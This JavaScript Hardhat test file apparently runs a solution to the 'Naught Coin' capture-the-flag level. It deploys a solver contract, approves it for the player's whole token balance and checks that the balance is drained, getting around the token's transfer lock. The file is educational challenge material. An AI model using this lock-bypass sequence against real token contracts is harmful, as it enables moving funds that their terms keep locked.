const { ethers } = require("hardhat")
const { assert } = require("chai")

/* 
    Enter the contract address below.
    Use `await contract.address in the console to get the address.
*/
const CONTRACT_ADDRESS = "0x3F28cAafB265E6655E18A7869cf6502F28eeB265"

describe("15 Naught Coin", function () {
    let player, challengeContract, solutionContract

    before(async function () {
        ;[player] = await ethers.getSigners()
        challengeContract = await ethers.getContractAt(
            "NaughtCoin",
            CONTRACT_ADDRESS,
            player
        )
        solutionContract = await (
            await ethers.getContractFactory("NaughtCoinSolution", player)
        ).deploy(CONTRACT_ADDRESS)
        const balanceBefore = await challengeContract.balanceOf(player.address)
        assert.notEqual(balanceBefore.toString(), "0")
    })

    it("Execution", async function () {
        const totalBalance = await challengeContract.balanceOf(player.address)
        const approvalResponse = await challengeContract.approve(
            solutionContract.address,
            totalBalance
        )
        await approvalResponse.wait(1)
        const txResponse = await solutionContract.solveChallenge()
        await txResponse.wait(1)
    })

    after(async function () {
        const balanceAfter = await challengeContract.balanceOf(player.address)
        assert.equal(balanceAfter.toString(), "0")
    })
})
